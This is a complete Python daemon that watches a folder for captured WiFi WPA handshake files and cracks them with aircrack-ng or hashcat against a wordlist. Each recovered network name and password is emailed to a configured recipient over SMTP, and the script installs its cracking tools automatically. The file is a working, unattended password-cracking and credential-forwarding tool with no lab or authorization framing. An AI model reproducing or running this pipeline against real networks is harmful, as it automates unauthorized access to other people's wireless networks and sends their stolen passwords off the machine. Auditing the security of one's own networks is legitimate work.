#!/usr/bin/env python3
"""
WiFi Handshake Cracker - Monitors a directory for handshake files,
cracks them, and sends the results via email.
"""

import os
import time
import subprocess
import logging
import smtplib
import tempfile
import shutil
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import re
import sys
import argparse
from pathlib import Path
import configparser
import signal
import daemon
from lockfile.pidlockfile import PIDLockFile

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("/var/log/handshake_cracker.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("handshake_cracker")

class HandshakeCracker:
    def __init__(self, config_path="/etc/handshake_cracker/config.ini"):
        """Initialize the HandshakeCracker with configuration."""
        self.config = self._load_config(config_path)
        self.monitor_dir = self.config.get('Directories', 'monitor_dir')
        self.wordlist_path = self.config.get('Directories', 'wordlist_path')
        self.temp_dir = tempfile.mkdtemp()
        self.timeout = 3600  # 1 hour in seconds
        
        # Email settings
        self.email_sender = self.config.get('Email', 'sender')
        self.email_password = self.config.get('Email', 'password')
        self.email_recipient = self.config.get('Email', 'recipient')
        self.email_server = self.config.get('Email', 'server')
        self.email_port = self.config.getint('Email', 'port')
        
        # Ensure required tools are installed
        self._check_dependencies()
        
        # Ensure the monitoring directory exists
        os.makedirs(self.monitor_dir, exist_ok=True)
        
        logger.info(f"HandshakeCracker initialized. Monitoring directory: {self.monitor_dir}")

    def _load_config(self, config_path):
        """Load configuration from file."""
        config = configparser.ConfigParser()
        
        # Default configuration
        config['Directories'] = {
            'monitor_dir': '/var/handshake_cracker/handshakes',
            'wordlist_path': '/var/handshake_cracker/wordlist.txt'
        }
        
        config['Email'] = {
            'sender': 'sender@gmx.de',
            'password': 'your_password',
            'recipient': 'recipient@example.com',
            'server': 'mail.gmx.net',
            'port': '587'
        }
        
        # Create config directory if it doesn't exist
        os.makedirs(os.path.dirname(config_path), exist_ok=True)
        
        # Read config file if it exists
        if os.path.exists(config_path):
            config.read(config_path)
        else:
            # Create default config file
            with open(config_path, 'w') as configfile:
                config.write(configfile)
            logger.info(f"Created default configuration file at {config_path}")
            
        return config

    def _check_dependencies(self):
        """Check and install required dependencies."""
        dependencies = ['aircrack-ng', 'hashcat']
        
        for dep in dependencies:
            try:
                subprocess.run(['which', dep], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                logger.info(f"{dep} is already installed.")
            except subprocess.CalledProcessError:
                logger.info(f"{dep} not found. Installing...")
                try:
                    subprocess.run(['apt-get', 'update'], check=True)
                    subprocess.run(['apt-get', 'install', '-y', dep], check=True)
                    logger.info(f"{dep} installed successfully.")
                except subprocess.CalledProcessError:
                    logger.error(f"Failed to install {dep}. Please install it manually.")
                    sys.exit(1)

    def _detect_file_type(self, file_path):
        """Detect the type of handshake file and convert if necessary."""
        file_extension = os.path.splitext(file_path)[1].lower()
        converted_path = None
        
        if file_extension in ['.cap', '.pcap', '.pcapng']:
            # Convert to hccapx for hashcat
            converted_path = os.path.join(self.temp_dir, "converted.hccapx")
            try:
                subprocess.run(
                    ['cap2hccapx', file_path, converted_path],
                    check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
                return 'hashcat', converted_path
            except subprocess.CalledProcessError:
                logger.warning("Failed to convert to hccapx. Trying aircrack-ng instead.")
                return 'aircrack-ng', file_path
        else:
            # If unknown extension, try both tools
            return 'aircrack-ng', file_path
            
    def _extract_ssid(self, file_path):
        """Extract SSID from handshake file."""
        try:
            output = subprocess.run(
                ['aircrack-ng', file_path],
                check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=30
            )
            
            # Extract SSID from aircrack-ng output
            ssid_match = re.search(r'SSID:\s+([^\n]+)', output.stdout)
            if ssid_match:
                return ssid_match.group(1).strip()
            else:
                logger.warning("Could not extract SSID from file.")
                return "Unknown SSID"
                
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
            logger.warning("Failed to extract SSID. Using filename instead.")
            return os.path.basename(file_path)

    def _crack_with_aircrack(self, file_path):
        """Attempt to crack the handshake using aircrack-ng."""
        try:
            output = subprocess.run(
                ['aircrack-ng', '-w', self.wordlist_path, file_path],
                check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=self.timeout
            )
            
            # Extract password from aircrack-ng output
            password_match = re.search(r'KEY FOUND!\s*\[\s*([^\]]+)\s*\]', output.stdout)
            if password_match:
                return password_match.group(1).strip()
            else:
                return None
                
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
            logger.error("Aircrack-ng failed or timed out")
            return None

    def _crack_with_hashcat(self, file_path):
        """Attempt to crack the handshake using hashcat."""
        output_file = os.path.join(self.temp_dir, "hashcat_output.txt")
        
        try:
            subprocess.run(
                ['hashcat', '-m', '2500', '-a', '0', file_path, self.wordlist_path, '-o', output_file],
                check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=self.timeout
            )
            
            # Check if output file exists and contains the password
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    content = f.read().strip()
                    if content:
                        # Extract password from hashcat output
                        password_match = re.search(r':(.*?)$', content)
                        if password_match:
                            return password_match.group(1).strip()
            
            return None
                
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
            logger.error("Hashcat failed or timed out")
            return None

    def _send_email(self, ssid, password):
        """Send email with the cracked password."""
        try:
            msg = MIMEMultipart()
            msg['From'] = self.email_sender
            msg['To'] = self.email_recipient
            msg['Subject'] = f"WiFi Password Cracked: {ssid}"
            
            body = f"SSID: {ssid}\nPassword: {password}"
            msg.attach(MIMEText(body, 'plain'))
            
            server = smtplib.SMTP(self.email_server, self.email_port)
            server.starttls()
            server.login(self.email_sender, self.email_password)
            text = msg.as_string()
            server.sendmail(self.email_sender, self.email_recipient, text)
            server.quit()
            
            logger.info(f"Email sent successfully for SSID: {ssid}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to send email: {str(e)}")
            return False

    def _process_handshake_file(self, file_path):
        """Process a handshake file to extract password."""
        logger.info(f"Processing handshake file: {file_path}")
        
        # Extract SSID
        ssid = self._extract_ssid(file_path)
        logger.info(f"Extracted SSID: {ssid}")
        
        # Detect file type and convert if necessary
        tool, cracking_file = self._detect_file_type(file_path)
        logger.info(f"Using {tool} with file {cracking_file}")
        
        # Try to crack the password
        password = None
        if tool == 'hashcat':
            password = self._crack_with_hashcat(cracking_file)
            # If hashcat fails, try aircrack-ng
            if not password:
                password = self._crack_with_aircrack(file_path)
        else:
            password = self._crack_with_aircrack(file_path)
            # If aircrack-ng fails, try to convert and use hashcat
            if not password:
                converted_path = os.path.join(self.temp_dir, "converted.hccapx")
                try:
                    subprocess.run(
                        ['cap2hccapx', file_path, converted_path],
                        check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                    )
                    password = self._crack_with_hashcat(converted_path)
                except subprocess.CalledProcessError:
                    logger.warning("Failed to convert for hashcat attempt")
        
        # Check if password was found
        if password:
            logger.info(f"Password found for {ssid}: {password}")
            # Send email with results
            if self._send_email(ssid, password):
                return True
        else:
            logger.warning(f"Failed to crack password for {ssid}")
            
        return False

    def monitor_directory(self):
        """Monitor directory for handshake files and process them."""
        logger.info(f"Starting to monitor directory: {self.monitor_dir}")
        
        while True:
            try:
                # Check for files in the directory
                for filename in os.listdir(self.monitor_dir):
                    file_path = os.path.join(self.monitor_dir, filename)
                    
                    # Skip directories
                    if os.path.isdir(file_path):
                        continue
                        
                    # Process the file
                    success = self._process_handshake_file(file_path)
                    
                    # Remove the file after processing
                    try:
                        os.remove(file_path)
                        logger.info(f"Removed file: {file_path}")
                    except OSError as e:
                        logger.error(f"Error removing file {file_path}: {str(e)}")
                
                # Wait 60 seconds before checking again
                time.sleep(60)
                
            except Exception as e:
                logger.error(f"Error in monitor loop: {str(e)}")
                # Continue monitoring despite errors
                time.sleep(60)
                
    def cleanup(self):
        """Clean up temporary files."""
        try:
            shutil.rmtree(self.temp_dir)
            logger.info("Cleaned up temporary directory")
        except OSError as e:
            logger.error(f"Error cleaning up temporary directory: {str(e)}")

def run_as_daemon(pid_file, config_path):
    """Run the HandshakeCracker as a daemon."""
    with daemon.DaemonContext(
        pidfile=PIDLockFile(pid_file),
        signal_map={
            signal.SIGTERM: lambda signum, frame: sys.exit(0),
            signal.SIGINT: lambda signum, frame: sys.exit(0),
        }
    ):
        cracker = HandshakeCracker(config_path)
        try:
            cracker.monitor_directory()
        finally:
            cracker.cleanup()

def main():
    """Main function to set up and run the HandshakeCracker."""
    parser = argparse.ArgumentParser(description='WiFi Handshake Cracker')
    parser.add_argument('--daemon', action='store_true', help='Run as a daemon')
    parser.add_argument('--config', default='/etc/handshake_cracker/config.ini', help='Path to configuration file')
    parser.add_argument('--pid-file', default='/var/run/handshake_cracker.pid', help='Path to PID file when running as daemon')
    args = parser.parse_args()
    
    if args.daemon:
        run_as_daemon(args.pid_file, args.config)
    else:
        cracker = HandshakeCracker(args.config)
        try:
            cracker.monitor_directory()
        except KeyboardInterrupt:
            logger.info("Stopping handshake cracker...")
        finally:
            cracker.cleanup()

if __name__ == "__main__":
    main()
